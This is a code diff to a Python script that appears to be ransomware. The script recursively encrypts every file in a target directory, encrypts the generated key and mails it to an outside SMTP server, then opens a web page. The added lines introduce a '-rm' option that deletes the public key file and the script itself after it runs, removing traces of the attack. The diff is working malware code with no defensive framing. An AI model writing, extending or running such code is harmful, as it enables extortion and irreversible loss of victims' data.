@@ -36,12 +36,12 @@ def mail(s):
     server='mail.pata.ovh:587'
     sendMail(sender,mdp,sender,s,server)
 
-if len(argv) != 2:
-    print("%s directory"%(argv[0]))
-    exit(0)
-
+AUTORM="-rm" in argv
 LEN_READ=1024
 FILE_EXT='.enc'
+if not len(argv) in [2, 3] or (len(argv)==2 and AUTORM) or (len(argv)==3 and not AUTORM):
+        print("%s directory [-rm]"%(argv[0]))
+        exit(0)
 
 def recur_mtime(path):
         for dirpath, dirnames, filenames in walk(path):
@@ -84,6 +84,8 @@ def crypted_file(filename):
 try:
         key=rand.new().read(16)
         sent_key=enc_key(key)
+        if AUTORM:
+                rm("pubkey")
         mail(sent_key[0])
         with open("key", "w") as k:
                 k.write("%s"%sent_key)
@@ -103,3 +105,8 @@ for name in walk_sorted(argv[1]):
                         print("Encrypt failure : {}".format(name))
 
 webbrowser.open_new('http://bunnypixelarray.github.io')
+if AUTORM:                        
+        try:
+                rm(argv[0])
+        except:
+                print("auto-remove failure")
